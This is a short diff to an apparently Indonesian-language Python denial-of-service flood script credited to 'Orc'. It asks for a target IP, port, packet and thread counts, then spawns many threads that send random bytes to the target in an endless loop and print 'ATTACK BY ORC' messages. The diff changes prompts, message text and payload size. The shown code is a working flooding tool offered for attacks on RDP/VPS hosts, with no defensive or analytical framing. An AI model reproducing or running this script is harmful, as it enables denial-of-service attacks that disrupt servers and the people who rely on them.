@@ -20,13 +20,13 @@ print("[#] Credit : Orc satier man")
 print("     || TCP || UDP || HTTPS ||         ")
 print("•-------------------------------------•")
 
-ip = str(input("[/] Enter RDP/VPS IP Nya : "))
-port = int(input("[/] Enter RDP/VPS Port (80/3389)   : "))
-times = int(input("[/] Enter Packet Coy : "))
-threads = int(input("[/] Enter Thread Coy (1000) : "))
+ip = str(input("[/] Ip : "))
+port = int(input("[/] Port Target   : "))
+times = int(input("[/] Packet : "))
+threads = int(input("[/] Thread : "))
 
 def run():
-    data = random._urandom(5000)
+    data = random._urandom(1000)
     i = random.choice(("[*]","[!]","[#]","[?]"))
     while True:
         try:
@@ -38,7 +38,7 @@ def run():
             print(i +" Orc!!!")
         except socket.error:
             s.close()
-            print("[!] Attacking By Orc Satier => ",ip," With Port : ",port,"!")
+            print("[*] ATTACK BY ORC => ",ip," MELUNCUR KE : ",port,"!")
 
 for y in range(threads):
     th = threading.Thread(target = run)
